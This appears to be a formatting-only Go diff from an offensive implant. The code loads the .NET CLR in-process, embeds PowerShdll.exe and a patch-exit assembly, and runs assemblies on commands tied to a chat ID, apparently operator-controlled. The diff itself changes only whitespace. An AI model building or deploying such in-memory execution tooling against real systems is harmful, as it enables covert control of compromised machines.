@@ -10,7 +10,6 @@ import (
 	clr "github.com/Ne0nd0g/go-clr"
 )
 
-
 var (
 	clrInstance *CLRInstance
 	assemblies  []*assembly
@@ -18,7 +17,7 @@ var (
 	patchExitAssembly []byte
 	//go:embed Assemblies/PowerShdll.exe
 	powershdllAssembly []byte
-	powershdllHash = md5.Sum(powershdllAssembly)
+	powershdllHash     = md5.Sum(powershdllAssembly)
 )
 
 type assembly struct {
@@ -30,7 +29,6 @@ type CLRInstance struct {
 	runtimeHost *clr.ICORRuntimeHost
 	sync.Mutex
 }
-
 
 func executeAssembly(chatID int64, data []byte, assemblyArgs []string, runtime string) {
 	rtHost := clrInstance.GetRuntimeHost(runtime)
@@ -143,7 +141,7 @@ func addAssembly(chatID int64, methodInfo *clr.MethodInfo, data []byte) {
 	asmHash := md5.Sum(data)
 	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
 	assemblies = append(assemblies, asm)
-	SendMessage(chatID, "Assembly hash: " + hex.EncodeToString(asmHash[:]))
+	SendMessage(chatID, "Assembly hash: "+hex.EncodeToString(asmHash[:]))
 }
 
 func getAssembly(data []byte) *assembly {
